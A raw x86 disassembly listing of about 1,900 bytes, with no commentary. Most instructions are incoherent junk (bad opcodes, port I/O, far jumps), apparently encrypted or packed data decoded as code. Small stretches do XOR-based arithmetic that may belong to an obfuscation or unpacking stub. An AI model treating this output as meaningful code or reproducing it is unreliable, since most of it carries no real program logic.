  409cf4:	push   ecx
  409cf5:	out    0xaa,eax
  409cf7:	push   esp
  409cf8:	stc    
  409cf9:	dec    esi
  409cfa:	in     al,dx
  409cfb:	out    0x2e,al
  409cfd:	je     0x409ce2
  409cff:	jle    0x409d7f
  409d01:	jp     0x409d80
  409d03:	jle    0x409d83
  409d05:	adc    edi,DWORD PTR [edx+0x29]
  409d08:	or     bl,bl
  409d0a:	sub    ecx,DWORD PTR [eax+0x78]
  409d0d:	mov    al,0x73
  409d0f:	mov    ds:0x24021d0b,eax
  409d14:	repz or DWORD PTR [edx-0x2f],edx
  409d18:	mov    ds:0x1c2f10a7,eax
  409d1d:	retf   0x87ef
  409d20:	lea    ebp,[eax]
  409d22:	cli    
  409d23:	sar    DWORD PTR [ebx+0x3],0x34
  409d27:	pop    ss
  409d28:	jmp    0x409d73
  409d2a:	jae    0x409d33
  409d2c:	pop    es
  409d2d:	scas   eax,DWORD PTR es:[edi]
  409d2e:	pop    eax
  409d2f:	sbb    al,0x7a
  409d31:	inc    ecx
  409d32:	cld    
  409d33:	inc    edx
  409d34:	and    edi,DWORD PTR ds:0xbdc7d95a
  409d3a:	add    eax,DWORD PTR [ecx]
  409d3c:	xchg   edi,eax
  409d3d:	stc    
  409d3e:	(bad)  
  409d3f:	rcr    bh,1
  409d41:	in     eax,dx
  409d42:	into   
  409d43:	push   esi
  409d44:	out    0x6a,al
  409d46:	retf   
  409d47:	fdiv   DWORD PTR [edi-0x17]
  409d4a:	mov    dl,BYTE PTR [ecx]
  409d4c:	jo     0x409d9b
  409d4e:	mov    BYTE PTR [edx+eiz*8-0x76],al
  409d52:	push   esp
  409d53:	sbb    DWORD PTR [ebx],ebp
  409d55:	je     0x409cda
  409d57:	xlat   BYTE PTR ds:[ebx]
  409d58:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d59:	mov    bl,0xb1
  409d5b:	xchg   edi,eax
  409d5c:	aad    0x33
  409d5e:	mov    edx,0xef8ff50a
  409d63:	xor    al,0x7e
  409d65:	fimul  DWORD PTR [edi+0x733fdce1]
  409d6b:	mov    eax,0x511e2b9b
  409d70:	sub    al,0x4c
  409d72:	mov    al,0x82
  409d74:	loop   0x409cfb
  409d76:	js     0x409d36
  409d78:	into   
  409d79:	and    esi,DWORD PTR [ebx-0xf]
  409d7c:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  409d7e:	div    BYTE PTR [esi+0x30]
  409d81:	(bad)  
  409d82:	pop    edi
  409d83:	ret    
  409d84:	xor    al,0x50
  409d86:	sbb    esi,DWORD PTR [ecx+0x623e31bf]
  409d8c:	dec    esi
  409d8d:	xchg   esi,eax
  409d8e:	sub    BYTE PTR ds:0x23ae0e39,cl
  409d94:	sbb    edi,DWORD PTR [eax-0x4f]
  409d97:	jl     0x409d9a
  409d99:	pusha  
  409d9a:	jbe    0x409dc9
  409d9c:	sbb    eax,0xc7e4d4d2
  409da1:	ins    BYTE PTR es:[edi],dx
  409da2:	fidivr DWORD PTR [ebp+0x51443168]
  409da8:	mov    dl,0x59
  409daa:	mov    WORD PTR [ebp-0x11],ss
  409dad:	inc    edx
  409dae:	adc    eax,0x96d81b1a
  409db3:	and    al,BYTE PTR [eiz*1-0x76c23257]
  409dba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409dbb:	test   eax,0x989c62fc
  409dc0:	enter  0xaaef,0xa
  409dc4:	loopne 0x409def
  409dc6:	mov    ah,0x28
  409dc8:	push   DWORD PTR [ebx-0x5240371a]
  409dce:	test   al,0x76
  409dd0:	sbb    BYTE PTR [ecx],bl
  409dd2:	push   esp
  409dd3:	mov    cs,WORD PTR [edx-0xdd4e855]
  409dd9:	or     eax,0x1924c37d
  409dde:	in     eax,dx
  409ddf:	pop    ebp
  409de0:	or     BYTE PTR [esi],0xf4
  409de3:	sti    
  409de4:	mov    ebx,cs
  409de6:	bound  ebx,QWORD PTR [edx]
  409de8:	inc    edx
  409de9:	sbb    DWORD PTR [edx-0x5d8a977a],ebp
  409def:	xlat   BYTE PTR ds:[ebx]
  409df0:	fadd   DWORD PTR [edx]
  409df2:	xor    BYTE PTR [ebx+0x4c],dh
  409df5:	jbe    0x409e69
  409df7:	call   0x5ee4736a
  409dfc:	aad    0xd2
  409dfe:	jle    0x409e72
  409e00:	(bad)  
  409e01:	aam    0x14
  409e03:	mov    WORD PTR [esi+0x3],fs
  409e06:	mov    edi,DWORD PTR [edx-0x7f]
  409e09:	xor    bl,BYTE PTR [edi-0x3b63eda5]
  409e0f:	push   ds
  409e10:	mov    dh,0x9f
  409e12:	pop    eax
  409e13:	(bad)  
  409e14:	adc    bl,bh
  409e16:	xor    al,0x13
  409e18:	add    BYTE PTR [esp+ecx*1],bh
  409e1b:	ret    
  409e1c:	iret   
  409e1d:	push   esi
  409e1e:	sbb    BYTE PTR [edx-0x72],ah
  409e21:	not    BYTE PTR gs:[esi+edx*8+0x69]
  409e26:	push   esp
  409e27:	push   eax
  409e28:	ds scas eax,DWORD PTR es:[edi]
  409e2a:	mov    edx,0xed75a4d0
  409e2f:	data16 out dx,al
  409e31:	cli    
  409e32:	jmp    0xfaca:0x92e942e2
  409e39:	push   0x2e
  409e3b:	dec    ebp
  409e3c:	aad    0xe7
  409e3e:	idiv   ch
  409e40:	jmp    0x409df2
  409e42:	xor    eax,0x192bc335
  409e47:	push   ds
  409e48:	jmp    0x6f1:0x553750a4
  409e4f:	repnz dec ebx
  409e51:	mov    ds:0x4b9b1f30,al
  409e56:	pop    eax
  409e57:	mov    ecx,0x6aac32bf
  409e5c:	xchg   edx,eax
  409e5d:	ja     0x409ec4
  409e5f:	arpl   si,bx
  409e61:	mov    ah,0x6a
  409e63:	sbb    al,BYTE PTR [ebp-0x5e082388]
  409e69:	sbb    BYTE PTR [ecx+0x66],dl
  409e6c:	adc    dl,ah
  409e6e:	sahf   
  409e6f:	aad    0x22
  409e71:	and    ebx,edx
  409e73:	mov    ds:0x85f23373,al
  409e78:	(bad)  
  409e79:	out    0xd,al
  409e7b:	adc    eax,0x31c8c47c
  409e80:	sub    DWORD PTR [ecx],edi
  409e82:	xchg   edx,eax
  409e83:	ja     0x409e2c
  409e85:	mov    WORD PTR [esi-0x3ae97d73],gs
  409e8b:	scas   al,BYTE PTR es:[edi]
  409e8c:	jmp    0x409e3d
  409e8e:	jno    0x409e28
  409e90:	push   esp
  409e91:	or     esi,DWORD PTR [eax-0x3421954d]
  409e97:	outs   dx,DWORD PTR ds:[esi]
  409e98:	scas   eax,DWORD PTR es:[edi]
  409e99:	and    al,0x66
  409e9b:	or     DWORD PTR [ebx+0x69],esp
  409e9e:	loopne 0x409e67
  409ea0:	pop    edx
  409ea1:	xchg   DWORD PTR [edi],eax
  409ea3:	bsr    ebp,DWORD PTR [ecx]
  409ea6:	scas   eax,DWORD PTR es:[edi]
  409ea7:	iret   
  409ea8:	retf   0xf20d
  409eab:	arpl   WORD PTR [edx],si
  409ead:	and    bh,BYTE PTR [ebx-0x80]
  409eb0:	sub    al,0x15
  409eb2:	std    
  409eb3:	ds push 0xb99fa402
  409eb9:	pop    ebp
  409eba:	dec    edx
  409ebb:	mov    eax,ds:0x2fb0d9a6
  409ec0:	dec    ebp
  409ec1:	push   ebx
  409ec3:	in     eax,0x2
  409ec5:	pop    esi
  409ec6:	pop    esp
  409ec7:	add    eax,0xdc1d88d7
  409ecc:	aaa    
  409ecd:	call   0xc598f0b4
  409ed2:	cmp    DWORD PTR [ecx-0x4b997f1f],eax
  409ed8:	xchg   esi,eax
  409ed9:	cmp    BYTE PTR [edx-0x5b],bl
  409edc:	iret   
  409edd:	in     al,0x5e
  409edf:	mov    bl,ch
  409ee1:	cmp    al,0x95
  409ee3:	and    al,0xdd
  409ee5:	mov    bl,0x97
  409ee7:	xlat   BYTE PTR ds:[ebx]
  409ee8:	cmp    al,0x52
  409eea:	pause  
  409eec:	xor    edx,DWORD PTR [ecx+0x75]
  409eef:	test   DWORD PTR [ebp+ebx*1+0x3448b127],0xf5fd05fa
  409efa:	xchg   esi,eax
  409efb:	call   0x2a2:0xead7b542
  409f02:	fucom  st(6)
  409f04:	or     BYTE PTR [ecx+esi*2],cl
  409f07:	jno    0x409f4d
  409f09:	inc    ebx
  409f0a:	je     0x409ec9
  409f0c:	sbb    DWORD PTR [esi-0x62],ecx
  409f0f:	push   ss
  409f10:	pop    ebp
  409f11:	xor    DWORD PTR ds:0x3eeb71a7,ecx
  409f17:	adc    al,0x9d
  409f19:	mov    dl,0xab
  409f1b:	dec    eax
  409f1c:	mov    bl,0x1f
  409f1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f1f:	stc    
  409f20:	out    0x42,al
  409f22:	inc    ebx
  409f23:	cmc    
  409f24:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  409f26:	retf   0xf795
  409f29:	mov    al,0x5b
  409f2b:	mov    WORD PTR [eax-0x3],ss
  409f2e:	and    al,0x31
  409f30:	shl    DWORD PTR [edx+0x4f],1
  409f33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f34:	push   0x6a
  409f36:	cmp    al,0xfd
  409f38:	loope  0x409f03
  409f3a:	retf   
  409f3b:	test   al,0xda
  409f3d:	xor    DWORD PTR [esi],esi
  409f3f:	pushf  
  409f40:	push   eax
  409f41:	outs   dx,DWORD PTR ds:[esi]
  409f42:	push   eax
  409f43:	rcr    al,1
  409f45:	clc    
  409f46:	pop    ss
  409f47:	fisubr DWORD PTR [ebx-0x6d06b3fe]
  409f4d:	pop    ecx
  409f4e:	mov    al,ah
  409f50:	(bad)  [edi+0x66d74d9a]
  409f56:	sub    ebp,DWORD PTR [edx-0x7f]
  409f59:	pop    edi
  409f5a:	sub    ah,BYTE PTR [edi-0x4]
  409f5d:	inc    edi
  409f5e:	je     0x409f20
  409f60:	and    eax,0xf5730b9b
  409f65:	xor    ebx,DWORD PTR [eax+0x30]
  409f68:	out    0xda,eax
  409f6a:	xor    eax,0x2d8c9e57
  409f6f:	imul   edx,DWORD PTR [ebx],0xffffffa7
  409f72:	enter  0x9eb6,0xec
  409f76:	arpl   sp,bp
  409f78:	dec    edi
  409f79:	out    0x85,eax
  409f7b:	adc    edi,esp
  409f7d:	jl     0x409fb6
  409f7f:	push   ecx
  409f80:	adc    eax,0xb44cca7d
  409f85:	pusha  
  409f86:	int    0xea
  409f88:	mov    gs,edx
  409f8a:	(bad)  
  409f8e:	sbb    al,0xa9
  409f90:	lods   eax,DWORD PTR ds:[esi]
  409f91:	jle    0x40a00a
  409f93:	sub    BYTE PTR [esi-0x2c14ca2b],cl
  409f99:	test   eax,0x252fb251
  409f9e:	imul   ebp,DWORD PTR [esi],0x340c9511
  409fa4:	std    
  409fa5:	fs add eax,0x6e7c5286
  409fab:	sti    
  409fac:	nop
  409fad:	jb     0x409fb1
  409faf:	mov    bh,0x3c
  409fb1:	ss leave 
  409fb3:	es mov ecx,0x30214f05
  409fb9:	jecxz  0x409fd4
  409fbb:	mov    al,ds:0xc384fad8
  409fc0:	sub    BYTE PTR [ecx],0xad
  409fc3:	mov    esi,0x5ad5fb0
  409fc8:	cli    
  409fc9:	jmp    0xcbc94cd6
  409fce:	adc    al,0x15
  409fd0:	or     esi,DWORD PTR [esi+ecx*8-0x33]
  409fd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409fd5:	sti    
  409fd6:	test   DWORD PTR [eax+esi*1-0xcaab392],ebx
  409fdd:	pop    DWORD PTR [eax]
  409fdf:	dec    ch
  409fe1:	cwde   
  409fe2:	fs pop es
  409fe4:	mov    ebp,0x838bb2f
  409fe9:	sti    
  409fea:	dec    edi
  409feb:	sub    al,0x41
  409fed:	sbb    BYTE PTR [esi*2-0x438e487e],ch
  409ff4:	jae    0x409f7a
  409ff6:	jbe    0x409f8a
  409ff8:	mov    edi,0x68fb35c5
  409ffd:	xchg   esi,eax
  409ffe:	mov    ah,0x6
  40a000:	js     0x409ff0
  40a002:	fdivrp st(0),st
  40a004:	add    ch,ah
  40a006:	out    dx,al
  40a007:	aam    0x55
  40a009:	mov    ecx,DWORD PTR [ebp-0x10]
  40a00c:	xor    eax,esi
  40a00e:	add    eax,edi
  40a010:	mov    DWORD PTR [ecx],eax
  40a012:	mov    eax,DWORD PTR [ebp-0x10]
  40a015:	mov    ecx,DWORD PTR [ebp+0x10]
  40a018:	jmp    0x40a339
  40a01d:	enter  0xca7a,0x5
  40a021:	enter  0xd1d5,0xd3
  40a025:	sbb    esi,esp
  40a027:	mul    DWORD PTR [ebx+0x11]
  40a02a:	sbb    bl,dh
  40a02c:	test   BYTE PTR [eax-0x12],dh
  40a02f:	jle    0x40a0af
  40a031:	jp     0x40a0b0
  40a033:	jle    0x40a0b3
  40a035:	jb     0x40a06a
  40a037:	outs   dx,BYTE PTR ss:[esi]
  40a039:	icebp  
  40a03a:	xchg   ecx,eax
  40a03b:	stos   BYTE PTR es:[edi],al
  40a03c:	xlat   BYTE PTR ds:[ebx]
  40a03d:	mul    BYTE PTR [eax-0x77]
  40a040:	loopne 0x40a085
  40a042:	int3   
  40a043:	cmp    BYTE PTR [edx+0xe292ade],dh
  40a049:	stc    
  40a04a:	std    
  40a04b:	retf   0x61e8
  40a04e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a04f:	icebp  
  40a050:	adc    ecx,DWORD PTR [ebx-0x1ee00c85]
  40a056:	add    al,0xf5
  40a058:	aam    0xad
  40a05a:	jl     0x40a00f
  40a05c:	xchg   DWORD PTR [ecx-0x585562f8],ebx
  40a062:	out    dx,al
  40a063:	sub    ebp,DWORD PTR gs:[ecx-0x12eb86a0]
  40a06a:	add    DWORD PTR [edx-0x23b564c0],ebx
  40a070:	add    cl,0x8d
  40a073:	stos   BYTE PTR es:[edi],al
  40a074:	popf   
  40a075:	cmp    edx,DWORD PTR gs:[ebx+0x69]
  40a079:	jecxz  0x40a04e
  40a07b:	es stos DWORD PTR es:[edi],eax
  40a07d:	stos   BYTE PTR es:[edi],al
  40a07e:	sbb    al,0x74
  40a080:	push   ds
  40a081:	data16 mov cl,0xe3
  40a084:	pop    ebx
  40a085:	jmp    0xa09e0447
  40a08a:	or     ch,BYTE PTR [ecx]
  40a08c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a08d:	push   cs
  40a08e:	fadd   DWORD PTR ds:0x320f9d45
  40a094:	push   0x4f1a0127
  40a099:	cmp    bh,dh
  40a09b:	lahf   
  40a09c:	icebp  
  40a09d:	pusha  
  40a09e:	dec    edx
  40a09f:	test   al,0x75
  40a0a1:	ins    DWORD PTR es:[edi],dx
  40a0a2:	test   edx,ecx
  40a0a4:	pop    ebp
  40a0a5:	push   edi
  40a0a6:	mov    esp,0xbf4788a9
  40a0ab:	sbb    DWORD PTR [edx],esp
  40a0ad:	inc    edi
  40a0ae:	(bad)  
  40a0af:	cmc    
  40a0b0:	pop    es
  40a0b1:	push   ecx
  40a0b2:	or     DWORD PTR [ebx],0x3f0ba946
  40a0b8:	mov    ecx,0xefa660df
  40a0bd:	jno    0x40a08d
  40a0bf:	mov    DWORD PTR [edi],eax
  40a0c1:	mov    ds:0x92338412,al
  40a0c6:	loopne 0x40a10a
  40a0c8:	mov    edx,es
  40a0ca:	adc    al,0x5e
  40a0cc:	adc    al,0x12
  40a0ce:	inc    edx
  40a0cf:	mov    DWORD PTR [edx-0x7036649e],eax
  40a0d5:	or     BYTE PTR [esi-0x4a1278cf],dl
  40a0db:	loopne 0x40a155
  40a0dd:	add    DWORD PTR [edx+edi*8+0x26055270],edx
  40a0e4:	pop    ebp
  40a0e5:	mov    edi,0x966d3f79
  40a0ea:	jbe    0x40a106
  40a0ec:	add    al,0x1d
  40a0ee:	imul   ecx,esp,0xffffff85
  40a0f1:	pusha  
  40a0f2:	ret    0xe35
  40a0f5:	fmul   st,st(3)
  40a0f7:	adc    al,0xe4
  40a0f9:	push   ebx
  40a0fa:	rcl    BYTE PTR ds:0x2082cf01,1
  40a100:	div    BYTE PTR ds:0xbe1f10ee
  40a106:	adc    bh,BYTE PTR [edi]
  40a108:	push   ecx
  40a109:	mov    eax,ds:0x75921116
  40a10e:	pop    esi
  40a10f:	(bad)  
  40a110:	or     eax,0xe684a788
  40a115:	dec    eax
  40a116:	mov    edi,0x2c1794b1
  40a11b:	in     eax,dx
  40a11c:	xchg   BYTE PTR [ebp+0x6d],dl
  40a11f:	mov    al,0x87
  40a121:	fdiv   QWORD PTR [edx-0x50]
  40a124:	(bad)  
  40a126:	adc    BYTE PTR [ebx+0x41412747],bl
  40a12c:	sub    eax,0xed376e0f
  40a131:	icebp  
  40a132:	pop    eax
  40a133:	in     eax,0x93
  40a135:	daa    
  40a136:	int    0x14
  40a138:	int    0x1d
  40a13a:	aam    0xa7
  40a13c:	out    0xc1,al
  40a13e:	push   edx
  40a13f:	fwait
  40a140:	xchg   edx,eax
  40a141:	inc    eax
  40a142:	into   
  40a143:	out    dx,eax
  40a144:	or     esp,DWORD PTR [esi]
  40a146:	and    ebx,esp
  40a148:	sbb    eax,0x3fe2836d
  40a14d:	mov    bh,BYTE PTR [edi]
  40a14f:	jo     0x40a152
  40a151:	mov    edi,0xbabd04e0
  40a156:	leave  
  40a157:	and    ebx,edi
  40a159:	inc    esi
  40a15a:	arpl   WORD PTR [ebp+0x2a],ax
  40a15d:	lods   al,BYTE PTR ds:[esi]
  40a15e:	lods   al,BYTE PTR ds:[esi]
  40a15f:	loopne 0x40a0ee
  40a161:	bound  ecx,QWORD PTR [eax+0x6e]
  40a164:	sbb    DWORD PTR [ecx+0x2b],edi
  40a167:	outs   dx,BYTE PTR ds:[esi]
  40a168:	sahf   
  40a169:	test   DWORD PTR [eax+0x422e88d],ebp
  40a16f:	cld    
  40a170:	push   cs
  40a171:	adc    al,0xcd
  40a173:	adc    al,0x51
  40a175:	sahf   
  40a176:	cld    
  40a177:	sub    al,0xb4
  40a179:	scas   eax,DWORD PTR es:[edi]
  40a17a:	aaa    
  40a17b:	(bad)  
  40a17c:	and    al,0xc1
  40a17e:	(bad)  
  40a17f:	push   eax
  40a180:	(bad)  
  40a181:	js     0x40a150
  40a183:	xor    DWORD PTR [ebp-0x12],0xddd37537
  40a18a:	stos   DWORD PTR es:[edi],eax
  40a18b:	mov    ah,0xc9
  40a18d:	xchg   ecx,eax
  40a18e:	bnd jp 0x40a174
  40a191:	cmp    DWORD PTR [edx-0x45],ebp
  40a194:	popf   
  40a195:	shr    esi,1
  40a197:	stos   BYTE PTR es:[edi],al
  40a198:	lds    esp,FWORD PTR [esp+ecx*8-0x7ead9f79]
  40a19f:	add    esi,DWORD PTR [ecx+0x647bbf26]
  40a1a5:	rcr    DWORD PTR [edx+ecx*1],cl
  40a1a8:	and    al,0xa5
  40a1aa:	int3   
  40a1ab:	mov    esp,0x19c26d36
  40a1b0:	cmp    BYTE PTR [edi-0x6b],0x18
  40a1b4:	push   ss
  40a1b5:	fs daa 
  40a1b7:	rcl    BYTE PTR [ecx+0x3883932f],1
  40a1bd:	test   al,0x1
  40a1bf:	imul   esi,DWORD PTR [esi+0x49],0xffffff96
  40a1c3:	xchg   ebx,eax
  40a1c4:	fdivr  st(5),st
  40a1c6:	shl    BYTE PTR [edi+0x23f21bfd],1
  40a1cc:	(bad)  
  40a1cd:	cs cld 
  40a1cf:	data16 ja 0x40a1cc
  40a1d2:	rol    dl,0xec
  40a1d5:	bound  esp,QWORD PTR [esi+0x594c7d44]
  40a1db:	stos   DWORD PTR es:[edi],eax
  40a1dc:	arpl   si,ax
  40a1de:	mov    dh,0x37
  40a1e0:	xor    DWORD PTR [ebx-0x53],ecx
  40a1e3:	int3   
  40a1e4:	or     eax,0x4ead7797
  40a1e9:	inc    ecx
  40a1ea:	repz jmpw 0xa7cb
  40a1ef:	adc    DWORD PTR [ecx+ecx*2+0x16],edx
  40a1f3:	ins    BYTE PTR es:[edi],dx
  40a1f4:	mov    ebp,0x1f891da3
  40a1f9:	mov    ecx,0xbeffbf5d
  40a1fe:	sbb    DWORD PTR [ebx],ecx
  40a200:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a201:	mov    ch,0x80
  40a203:	shr    BYTE PTR [ecx-0x5d],0x60
  40a207:	aam    0x71
  40a209:	gs sahf 
  40a20b:	mov    edx,0x795d6504
  40a210:	inc    eax
  40a211:	icebp  
  40a212:	jb     0x40a240
  40a214:	add    edi,esp
  40a216:	cwde   
  40a217:	mov    esp,0x3fc69e6c
  40a21c:	push   ds
  40a21d:	fwait
  40a21e:	push   es
  40a21f:	gs das 
  40a221:	or     DWORD PTR [esi+0x63eef4ae],edi
  40a227:	xor    DWORD PTR [eax-0x26367d5b],esp
  40a22d:	out    dx,al
  40a22e:	adc    al,0x6d
  40a230:	xchg   BYTE PTR [ecx+0x4f99392f],ch
  40a236:	and    eax,0xd6720974
  40a23b:	dec    BYTE PTR [esi+0x3cab6a2a]
  40a241:	xor    cl,BYTE PTR [si-0x7c]
  40a245:	mov    dh,0x8
  40a247:	cs int 0xa4
  40a24a:	jge    0x40a26a
  40a24c:	outs   dx,DWORD PTR ds:[esi]
  40a24d:	test   DWORD PTR [edi-0x382d9209],ecx
  40a253:	daa    
  40a254:	out    0x30,eax
  40a256:	(bad)  
  40a257:	int    0x82
  40a259:	js     0x40a21e
  40a25b:	mov    al,0x2f
  40a25d:	inc    edx
  40a25e:	ins    DWORD PTR es:[edi],dx
  40a25f:	xchg   edx,eax
  40a260:	lock mov es,WORD PTR [eax+0x2d]
  40a264:	mov    esi,ebx
  40a266:	mov    bh,0xd
  40a268:	push   ebp
  40a269:	imul   edx,DWORD PTR [ecx],0x86a0d828
  40a26f:	shl    ebp,cl
  40a271:	and    al,0x29
  40a273:	push   esi
  40a274:	(bad)  
  40a275:	test   eax,0xa9b3c767
  40a27a:	fcomp  DWORD PTR [eax+0x31]
  40a27d:	mov    ecx,cr1
  40a280:	lahf   
  40a281:	push   esp
  40a282:	mov    eax,0xb849c442
  40a287:	stc    
  40a288:	loop   0x40a2ae
  40a28a:	xor    ebx,eax
  40a28c:	ret    0x9b84
  40a28f:	daa    
  40a290:	or     BYTE PTR [esi],al
  40a292:	int    0xff
  40a294:	jmp    0x3cf79598
  40a299:	test   eax,0x30bf70f3
  40a29e:	dec    ebp
  40a29f:	les    ecx,FWORD PTR [esi]
  40a2a1:	fdivr  QWORD PTR [ebp+0x66]
  40a2a4:	and    BYTE PTR [edi-0x7e],bl
  40a2a7:	ins    WORD PTR es:[edi],dx
  40a2a9:	or     al,0x44
  40a2ab:	mov    DWORD PTR [edi-0x10],esi
  40a2ae:	jne    0x40a238
  40a2b0:	mov    eax,ds:0x360940d0
  40a2b5:	aas    
  40a2b6:	aaa    
  40a2b7:	mov    dl,0x85
  40a2b9:	dec    ebp
  40a2ba:	adc    al,BYTE PTR [edi]
  40a2bc:	enterw 0x514,0xa0
  40a2c1:	push   edx
  40a2c2:	jecxz  0x40a2fc
  40a2c4:	pop    ds
  40a2c5:	mov    ah,0x12
  40a2c7:	loop   0x40a26f
  40a2c9:	jge    0x40a341
  40a2cb:	leave  
  40a2cc:	out    dx,al
  40a2cd:	aaa    
  40a2ce:	mov    WORD PTR [ebp+ebp*8-0x50],cs
  40a2d2:	pop    edi
  40a2d3:	dec    ebp
  40a2d4:	scas   al,BYTE PTR es:[edi]
  40a2d5:	mov    ds:0x137ade48,al
  40a2da:	dec    edi
  40a2db:	adc    BYTE PTR [ebx+ecx*8-0xf9f1b35],ch
  40a2e2:	push   edi
  40a2e3:	cwde   
  40a2e4:	addr16 xor al,0xc4
  40a2e7:	cwde   
  40a2e8:	imul   edi,DWORD PTR [edx-0x801fdb6],0x683fe29b
  40a2f2:	out    0xe0,al
  40a2f4:	dec    eax
  40a2f5:	aam    0x3f
  40a2f7:	cmp    eax,0x185b6a76
  40a2fc:	xor    ebx,ecx
  40a2fe:	cli    
  40a2ff:	repnz and BYTE PTR [ebp+0x3c],ah
  40a303:	(bad)  
  40a304:	into   
  40a305:	rcr    ch,cl
  40a307:	fwait
  40a308:	jp     0x40a315
  40a30a:	inc    ebp
  40a30b:	xor    eax,0x2c6bff68
  40a310:	add    eax,0x56f1be2d
  40a315:	pop    edx
  40a316:	lock sbb ecx,DWORD PTR [ebx]
  40a319:	imul   eax,DWORD PTR [edi],0x34
  40a31c:	repnz or DWORD PTR [ecx-0x55],ebp
  40a320:	adc    DWORD PTR [eax],edx
  40a322:	jle    0x40a340
  40a324:	add    eax,ebp
  40a326:	mov    ss:0xdfee2a31,al
  40a32c:	xor    eax,0x362e72a7
  40a331:	leave  
  40a332:	xor    ecx,DWORD PTR [esi+0x5e]
  40a335:	mov    eax,ds:0x336b1183
  40a33a:	into   
  40a33b:	mov    edx,0xffcd8d65
  40a340:	sub    edx,ecx
  40a342:	add    DWORD PTR [eax],edx
  40a344:	mov    eax,ds:0x413cb2
  40a349:	mov    eax,DWORD PTR [eax]
  40a34b:	mov    cx,WORD PTR [ebp-0x4]
  40a34f:	movzx  ecx,cx
  40a352:	add    ecx,DWORD PTR [eax]
  40a354:	mov    DWORD PTR [ebp-0x18],ecx
  40a357:	mov    eax,DWORD PTR [ebp+0xc]
  40a35a:	mov    ecx,DWORD PTR [ebp+0xc]
  40a35d:	xor    eax,esi
  40a35f:	add    eax,eax
  40a361:	xor    ecx,esi
  40a363:	sub    ecx,eax
  40a365:	mov    ax,WORD PTR [ebp-0x4]
  40a369:	movzx  eax,ax
  40a36c:	sub    ecx,edi
  40a36e:	cmp    eax,ecx
  40a370:	mov    eax,DWORD PTR [ebp+0x10]
  40a373:	movzx  ecx,WORD PTR [ebp-0x4]
  40a377:	jg     0x40a38c
  40a37d:	xor    eax,esi
  40a37f:	sub    ecx,eax
  40a381:	sub    ecx,edi
  40a383:	mov    WORD PTR [ebp-0x4],cx
  40a387:	jmp    0x40a399
  40a38c:	xor    eax,esi
  40a38e:	lea    eax,[eax+ecx*1+0x32729b]
  40a395:	mov    WORD PTR [ebp-0x4],ax
  40a399:	mov    eax,DWORD PTR [ebp-0xc]
  40a39c:	cmp    eax,ebx
  40a39e:	je     0x40a3b2
  40a3a4:	mov    eax,DWORD PTR [ebp-0x8]
  40a3a7:	mov    DWORD PTR [eax],0x60341e89
  40a3ad:	jmp    0x40c082
  40a3b2:	mov    eax,DWORD PTR [ebp+0x8]
  40a3b5:	mov    ecx,DWORD PTR [ebp-0x8]
  40a3b8:	xor    eax,esi
  40a3ba:	jmp    0x40a6db
  40a3bf:	retf   0x3136
  40a3c2:	out    dx,al
  40a3c3:	icebp  
  40a3c4:	jmp    0x20e2d69a
  40a3c9:	inc    ebx
  40a3ca:	popf   
  40a3cb:	mov    ch,0xf1
  40a3cd:	mov    dl,0x80
  40a3cf:	jl     0x40a3bb
  40a3d1:	jle    0x40a451
  40a3d3:	jp     0x40a452
  40a3d5:	jle    0x40a455
  40a3d7:	mov    al,0x3e
  40a3d9:	or     BYTE PTR [ecx-0x67d2b2c9],bh
  40a3df:	pop    edi
  40a3e0:	jnp    0x40a449
  40a3e2:	and    al,0xc7
  40a3e4:	es mov ebx,0x61df94b5
  40a3ea:	ins    DWORD PTR es:[edi],dx
  40a3eb:	mov    ch,BYTE PTR ds:0x32d01739
  40a3f1:	push   0x48ae1471
  40a3f6:	loope  0x40a42c
  40a3f8:	inc    ebx
  40a3f9:	mov    bh,0xdb
  40a3fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a3fc:	push   esp
  40a3fd:	xor    al,0x2e
  40a3ff:	dec    ebp
  40a400:	or     DWORD PTR [ebx],ebp
  40a402:	jns    0x40a3d0
  40a404:	push   edx
  40a405:	cli    
  40a406:	ja     0x40a449
  40a408:	sub    al,0x25
  40a40a:	call   0x7d25:0xa6589a67
  40a411:	rcl    BYTE PTR [edx+eax*8-0xec1e3b5],0x5b
  40a419:	dec    edx
  40a41a:	cmp    al,0x7e
  40a41c:	adc    ebp,DWORD PTR [eax-0x218c3ce0]
  40a422:	jle    0x40a46d
  40a424:	jge    0x40a419
  40a426:	push   0x16d16961
  40a42b:	retf   
  40a42c:	cmp    dh,BYTE PTR [ebx]
  40a42e:	cmp    BYTE PTR [ecx-0x32303f44],bh
  40a434:	icebp  
  40a435:	in     al,0xd
  40a437:	cmp    al,0x3b
  40a439:	push   esp
  40a43a:	(bad)  
  40a43b:	outs   dx,DWORD PTR ds:[esi]
  40a43c:	cmp    eax,DWORD PTR [edi-0x65e44b49]
  40a442:	sar    esi,0x8d
  40a445:	xlat   BYTE PTR ds:[ebx]
  40a446:	xchg   ebx,eax
  40a447:	and    eax,0x1dd460a9
  40a44c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a44d:	xor    eax,0x63346895
  40a452:	mov    cl,0xcf
  40a454:	ret    0x340
  40a457:	jo     0x40a40c
  40a459:	mov    ds:0x3e9ba4a8,eax
  40a45e:	pusha  
  40a45f:	push   0xa9051fed
  40a464:	mov    esp,0xa9eeeb24
  40a469:	dec    ebp
  40a46a:	int3   
  40a46b:	call   0xa6040e7a
  40a470:	pop    esi
  40a471:	sub    eax,DWORD PTR [ecx+ecx*1]
  40a474:	push   ebx
  40a475:	lahf   
  40a476:	xchg   ebp,eax
  40a477:	push   0xc275e0e2
  40a47c:	dec    eax
  40a47d:	sub    ebp,DWORD PTR [eax-0x52dc46cb]
  40a483:	xchg   esp,eax
  40a484:	xchg   ebx,eax
  40a485:	or     ah,al
  40a487:	call   0xba6a1aa6
  40a48c:	mov    dh,0xf0
  40a48e:	pop    esp
  40a48f:	jns    0x40a4a8
  40a491:	popa   
  40a492:	jb     0x40a459
  40a494:	sbb    al,0xe5
